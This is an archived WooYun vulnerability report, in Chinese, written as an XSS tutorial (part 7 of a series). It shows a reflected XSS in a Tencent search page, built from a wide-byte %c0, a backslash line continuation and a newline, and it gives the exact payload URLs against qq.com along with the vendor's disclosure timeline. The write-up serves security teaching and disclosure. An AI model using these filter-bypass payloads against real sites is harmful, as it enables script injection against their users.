@@ -1,0 +1,279 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		[腾讯实例教程] 那些年我们一起学XSS - 7. 宽字节、反斜线与换行符一起复仇记  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		[腾讯实例教程] 那些年我们一起学XSS - 7. 宽字节、反斜线与换行符一起复仇记  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/心伤的瘦子">心伤的瘦子</a> 
+</li><li>提交时间：		2012-12-14 13:06</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-12-14：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-12-17：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-12-27：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-01-06：	细节向普通白帽子公开<br/>
+									2013-01-16：	细节向实习白帽子公开<br/>
+									2013-01-28：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">这一次，3个家伙一起上啦～</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 实例点如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://cgi.data.tech.qq.com/index.php?mod=search&amp;type=data&amp;site=digi&amp;libid=2&amp;curpage=1&amp;pagenum=30&amp;filterattr=138,138|16|4,5,4,5&amp;filtervalue=3500-4000,%B4%F3%D3%DA4000|%D0%FD%D7%AA|WCDMA,WCDMA,HSDPA,HSDPA&amp;tplname=centersearch.shtml&amp;orderby=aaaaaaaaaaaa</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+老规矩，继续看我们的输出。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/14124519564de442c1c675d2b38e381bdc4b83b5.jpg" target="_blank"><img src="../images/14124519564de442c1c675d2b38e381bdc4b83b5.jpg" alt="27.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2. 一共有3处输出，位于HTML属性里的那一处，我们放弃了，因为双引号被灭掉了。那么还剩下2处。 都是位于&lt;script&gt;..&lt;/script&gt;里，而且挨在了一起。<br />
+<br />
+<br />
+<br />
+3. 先看第2处，是不是似曾相似啊？ 对的，教程6里刚刚遇到过。那就是输出在【注释】的情况。我们用换行符试试？<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/141251214cfa7d0d678d107ec4ffd8284067c6db.jpg" target="_blank"><img src="../images/141251214cfa7d0d678d107ec4ffd8284067c6db.jpg" alt="28.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+4. 一条是好消息，换行可以用，一条是坏消息。。下面出现的一句坏了我们的好事。。肿么办。<br />
+<br />
+<br />
+<br />
+5. 这个时候，我们需要先说点javascript的知识。<br />
+<br />
+<br />
+<br />
+javascript，字符串允许下面多行的写法。<br />
+<br />
+<br />
+<br />
+</p><pre><code>var  a=&quot;我是一个字符串\<br />
+我还是一个字符串&quot;;<br />
+<br />
+alert(a);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+6. 基于这点，我们可以把缺陷点构造成下面的样子。<br />
+<br />
+<br />
+<br />
+</p><pre><code>//document.getElementById(&quot;order_select&quot;).value = &quot;aaaa\<br />
+alert(1);//&quot;;<br />
+<br />
+	var searchOrder = &quot;aaaa\<br />
+alert(1);//&quot;;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+那么代码构造的解析如下：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/14125606c3be133719358dab2be84372a0d46f6c.jpg" target="_blank"><img src="../images/14125606c3be133719358dab2be84372a0d46f6c.jpg" alt="29.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+7.带着这个想法，请上我们的反斜线。。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/141257324a7d4081ef5ffbabc78c42622e394374.jpg" target="_blank"><img src="../images/141257324a7d4081ef5ffbabc78c42622e394374.jpg" alt="30.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+8. 悲剧的是，反斜线被过滤成了2个\\，这下不好办了。<br />
+<br />
+<br />
+<br />
+9. 还记得在教程4里，我们提到的宽字节用法么？说到了 %c0可以吃掉%5c。<br />
+<br />
+<br />
+<br />
+我们看看页面的编码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot; /&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+gbxxx系列的啊，窃喜中。<br />
+<br />
+<br />
+<br />
+10. 于是，我们的%c0也加入战斗了。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://cgi.data.tech.qq.com/index.php?mod=search&amp;type=data&amp;site=digi&amp;libid=2&amp;curpage=1&amp;pagenum=30&amp;filterattr=138,138|16|4,5,4,5&amp;filtervalue=3500-4000,%B4%F3%D3%DA4000|%D0%FD%D7%AA|WCDMA,WCDMA,HSDPA,HSDPA&amp;tplname=centersearch.shtml&amp;orderby=aaaa%c0%5c%0aalert(1);//</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+看看源码中的输出。 \\ 被我们变成了 乱码+\<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1413015032a6e155c574bfaee8d68dc2725908e8.jpg" target="_blank"><img src="../images/1413015032a6e155c574bfaee8d68dc2725908e8.jpg" alt="31.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+11. 最后弹窗，见漏洞证明～～<br />
+<br />
+<br />
+<br />
+12. 此时，标点符号们正在开会，开会的主题是：“大家好，才是真的好” </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/141303323477ebd4dac0f8a8aa294c5d7a2fc0e6.jpg" target="_blank"><img src="../images/141303323477ebd4dac0f8a8aa294c5d7a2fc0e6.jpg" alt="32.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">参加前面教程4，5，6 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/心伤的瘦子" title="心伤的瘦子">心伤的瘦子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-016008" title="[腾讯实例教程] 那些年我们一起学XSS - 7. 宽字节、反斜线与换行符一起复仇记">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2012-12-17 15:07</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="16008";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
